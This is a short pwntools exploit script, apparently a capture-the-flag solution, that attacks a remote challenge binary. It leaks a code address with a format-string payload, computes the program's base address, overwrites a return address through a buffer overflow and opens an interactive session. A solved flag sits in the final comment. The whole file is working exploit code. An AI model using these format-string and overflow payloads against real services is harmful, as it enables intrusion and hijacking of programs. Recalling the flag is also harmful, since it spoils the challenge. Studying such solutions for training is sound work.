from pwn import *
#context.log_level="debug"
e=ELF("./chal")
#io=process(e.path)
io=remote("23.146.248.230", 12355)

io.recvline()
while b"fsb" not in io.recv():
    io.sendline("owo")

io.sendline("%9$pAAAA")
leak=io.recvuntil("AAAA").decode()[:-4]
leak=int(leak, 16)
base=leak-0x12d9
success("ELF base : %s" % hex(base))

while b"bof" not in io.recv():
    io.sendline("owo")

success("bof")
payload=cyclic(0x18)+p64(base+0x1366)
io.sendline(payload)

io.interactive()
#THJCC{E$C4Pe_FRoM_TH3_InF!NI7E_r3CURS!on}
